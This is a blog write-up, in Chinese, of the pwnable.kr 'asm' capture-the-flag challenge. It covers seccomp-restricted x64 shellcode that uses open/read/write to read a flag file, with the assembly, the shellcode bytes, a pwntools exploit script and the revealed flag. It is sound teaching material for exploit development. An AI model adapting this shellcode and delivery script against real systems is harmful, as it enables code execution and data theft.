---
layout: post
title: 【pwnable.kr】asm_学习shellcode
date: 2018-8-11
categories: blog
tags: 
description: 
---

##简介
pwnable.kr上的题目对ctf入门级选手比较友好，作为一名新手在刷题中可以不断的点亮各种技能树。
asm题是一道需要依靠shellcode来解题的，虽然python的pwntools包含了shellcraft模块，可以简单的生成shellcode，但是，需要点亮技能树的我怎么可能会走捷径呢，于是本文就以asm题目为例，学习shellcode的写法。

##asm题目
```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#define LENGTH 128

void sandbox(){
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
        printf("seccomp error\n");
        exit(0);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    if (seccomp_load(ctx) &lt; 0){
        seccomp_release(ctx);
        printf("seccomp error\n");
        exit(0);
    }
    seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    printf("Welcome to shellcoding practice challenge.\n");
    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
    printf("If this does not challenge you. you should play 'asg' challenge :)\n");

    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
    memset(sh, 0x90, 0x1000);
    memcpy(sh, stub, strlen(stub));
    
    int offset = sizeof(stub);
    printf("give me your x64 shellcode: ");
    read(0, sh+offset, 1000);

    alarm(10);
    chroot("/home/asm_pwn");    // you are in chroot jail. so you can't use symlink in /tmp
    sandbox();
    ((void (*)(void))sh)();
    return 0;
}
```

##解题思路
题目逻辑比较简单，因此解题思路也比较清晰：

构造shellcode，因为沙箱的限制，所以shellcode中只能使用open/read/write/exit/exit_group这5个函数。

shellcode需要完成以下功能：

    1. push存放flag的文件名（this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong，天晓得为啥起这么长的文件名……）
    2. 使用open函数打开文件
    3. 使用read函数读取文件内容（为了方便，直接读64字节，flag一般不超过这个长度……）
    4. 使用write函数把读取到的内容写入stdout

##构造shellcode
网上有多种构造shellcode的方法，本文使用的是直接写汇编代码的方法
注：题目为64位的，因此需使用64位的寄存器
```
global _start
_start:
xor rsi, rsi    # 清空rsi寄存器
xor rdi, rdi    # 清空rdi寄存器
xor rdx, rdx    # 清空rdx寄存器

# 将文件名入栈，this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
# 注意两点：
# 1. 栈是先进后出，因此文件名从o0o0ong开始先入栈；
# 2. 为了字节小端对齐，因此入栈字符串需要倒着写，即o0o0ong对应0x676e6f306f306f
push rdx
mov rax, 0x676e6f306f306f
push rax
mov rax, 0x306f306f306f306f
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x303030306f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
push rax
mov rax, 0x6f6f6f3030303030
push rax
mov rax, 0x3030303030303030
push rax
push rax
mov rax, 0x303030306f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
push rax
mov rax, 0x6c5f797265765f73
push rax
mov rax, 0x695f656d616e5f65
push rax
mov rax, 0x6c69665f6568745f
push rax
mov rax, 0x7972726f732e656c
push rax
mov rax, 0x69665f736968745f
push rax
mov rax, 0x646165725f657361
push rax
mov rax, 0x656c705f656c6966
push rax
mov rax, 0x5f67616c665f726b
push rax
mov rax, 0x2e656c62616e7770
push rax
mov rax, 0x5f73695f73696874
push rax

# 调用open函数(函数调用表在代码结尾处注明)
# rdi存放文件名(文件名入栈后的rsp指针)
# rax存放调用号(2)
mov rdi, rsp
xor rax, rax
mov al, 02h
syscall
nop

# 调用read函数
# rdi存放fd(open函数返回的rax)
# rsi存放文件内容，即flag(往栈中开一块64字节的空间，rsp)
# rdx存放读取字符串的长度(64字节)
# rax存放调用号(0)
sub rsp, 100
mov rdi, rax
mov rsi, rsp
xor rdx, rdx
add rdx, 100
xor rax, rax
syscall
nop

# 调用write函数
# rdi存放输出位置(stdout, 因为shellcode不能有0x00，因此使用清零后加1的方法来设置rdi的值)
# rsi存放输出内容，即flag(复用read函数的参数即可)
# rdx存放输出字符串的长度(复用read函数的参数即可)
# rax存放调用号(1)
xor rdi, rdi
inc rdi
xor rax, rax
mov al, 01h
syscall
ret
```

注：64位Linux系统调用表如下
>http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

注：32位Linux系统调用表如下
>http://syscalls.kernelgrok.com/

有了代码，然后就是编译运行

`nasm -f elf64 test.asm -g -F stabs -o test.o`

`for i in $(objdump -d test.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo`

得到shellcode如下：
>\x48\x31\xf6\x48\x31\xff\x48\x31\xd2\x52\x48\xb8\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x50\x48\xb8\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x50\x48\xb8\x30\x30\x30\x30\x30\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x50\x50\x50\x50\x50\x50\x50\x50\x48\xb8\x73\x5f\x76\x65\x72\x79\x5f\x6c\x50\x48\xb8\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x50\x48\xb8\x5f\x74\x68\x65\x5f\x66\x69\x6c\x50\x48\xb8\x6c\x65\x2e\x73\x6f\x72\x72\x79\x50\x48\xb8\x5f\x74\x68\x69\x73\x5f\x66\x69\x50\x48\xb8\x61\x73\x65\x5f\x72\x65\x61\x64\x50\x48\xb8\x66\x69\x6c\x65\x5f\x70\x6c\x65\x50\x48\xb8\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x50\x48\xb8\x70\x77\x6e\x61\x62\x6c\x65\x2e\x50\x48\xb8\x74\x68\x69\x73\x5f\x69\x73\x5f\x50\x48\x89\xe7\x48\x31\xc0\xb0\x02\x0f\x05\x90\x48\x83\xec\x64\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x64\x48\x31\xc0\x0f\x05\x90\x48\x31\xff\x48\xff\xc7\x48\x31\xc0\xb0\x01\x0f\x05\xc3

##获取flag

有了shellcode后，获取flag就好说了

用python的pwntools把shellcode写入服务器即可，代码如下

```
from pwn import *
con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')
#p = process('./asm')
sh = '\x48\x31\xf6\x48\x31\xff\x48\x31\xd2\x52\x48\xb8\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x50\x48\xb8\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x50\x48\xb8\x30\x30\x30\x30\x30\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x50\x50\x50\x50\x50\x50\x50\x50\x48\xb8\x73\x5f\x76\x65\x72\x79\x5f\x6c\x50\x48\xb8\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x50\x48\xb8\x5f\x74\x68\x65\x5f\x66\x69\x6c\x50\x48\xb8\x6c\x65\x2e\x73\x6f\x72\x72\x79\x50\x48\xb8\x5f\x74\x68\x69\x73\x5f\x66\x69\x50\x48\xb8\x61\x73\x65\x5f\x72\x65\x61\x64\x50\x48\xb8\x66\x69\x6c\x65\x5f\x70\x6c\x65\x50\x48\xb8\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x50\x48\xb8\x70\x77\x6e\x61\x62\x6c\x65\x2e\x50\x48\xb8\x74\x68\x69\x73\x5f\x69\x73\x5f\x50\x48\x89\xe7\x48\x31\xc0\xb0\x02\x0f\x05\x90\x48\x83\xec\x64\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x64\x48\x31\xc0\x0f\x05\x90\x48\x31\xff\x48\xff\xc7\x48\x31\xc0\xb0\x01\x0f\x05\xc3'

p.recvuntil('shellcode: ')
p.send(sh)
print p.recv(60)
```

得到shellcode(由于读的64字节，因此flag后面有一些其他字符)
```
# python wp.py 
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Connecting to localhost:9026 via SSH to pwnable.kr: Done
Mak1ng_shelLcodE_i5_veRy_eaSy
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x7f\x00\x00\x00\x00
[*] Closed remote connection to localhost:9026 via SSH connection to pwnable.kr
```

大功告成。
